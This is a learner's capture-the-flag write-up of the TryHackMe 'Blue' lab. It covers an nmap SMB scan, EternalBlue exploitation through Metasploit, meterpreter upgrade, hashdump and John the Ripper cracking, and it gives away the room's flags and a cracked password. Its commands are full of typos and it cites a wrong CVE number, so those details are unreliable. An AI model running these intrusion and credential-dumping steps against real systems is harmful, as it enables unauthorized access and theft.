Try Hack Me: Blue

Once scamming the machine, I saw there were 3 ports open with a part number under 1000.
I used -al /usr/share/nmap/scripts | grep -e "smb-" to find the vulbnerability code. I googled some of the codes, and the one that stuck out to me was vuln-ms17-010.nse so I entered $ sudo nmap -sS -Pn -p 445 10.10.2.188 --script smb-vuln-ms17-010.nse and it performed a scan which told me it was vulnerable to "remote code execution vulnerability in Microsoft SMBv1 servers" CVE: CVE-2017-03-14. I entered into the answer key that it was vulnerable to: "ms17-010" and it said I was correct.

I searched for Eternalblue and copied the string that worked for windows 7 and pasted that code into tryhackme. "expliot/windows/smb/ms17_010_etneralblue" and ti said I was correct. I then moved on to the next step and entered "show options" which brought up a list and I decided to use "set RHOSTS" with the IP 10.10.71.59.

I set the LHOST to my IP with the vpn and waited for quite a while. I background the previous shell using "post/multi/manage/shell_to_meterpreter" I chanfed "SESSION" in the options. and I set the sessions to "Session 1" and told it to run. It said that the session may not be compatible with this modual. I entered back into my session using "SESSIONS 1" 

I then ran sysinfo to try to get the info and it didnt give me what I was looking for, so I tried shell and then whoami and it showed the NT AUTHORITY the question asked for. 

To find the process ID the page asked for, I typed "exit" and then listed processes using ps. The process it asked for was 2596. I used "Migrate 2596" but it failed. I tried "Migrate 2488" failed. I found out there was nothing to migrate.

This part confused me a bit, so I did some googling but I used "hashdump" and it gave me some hashes for the users for the system and saved them. I used John The Ripper. The name of the non-default user was "Jon". I am struggling a lot with the cracking portion, so I tried to look up a few different articles and videos on how to do it. 
---It recommended I used "ls -al /usr/share/wordlists/ and then used "gzip -d /usr/share/wordlists/rocjyou.txt.gz and then used "sudo john --form=NT --wordlists=/usr/share/wordlists/rockyou.txt hashes.txt and it showed me the password for algfna22

Flag 1: moved the root folder and cat flag1.txt to get flag{access_the_machine}
Flag 2: In c:\windows\system32\config and got flag{sam_database_elevated_access}
Flag 3: I found this one in the user documents flag{admin_documents_can_be_valuable}
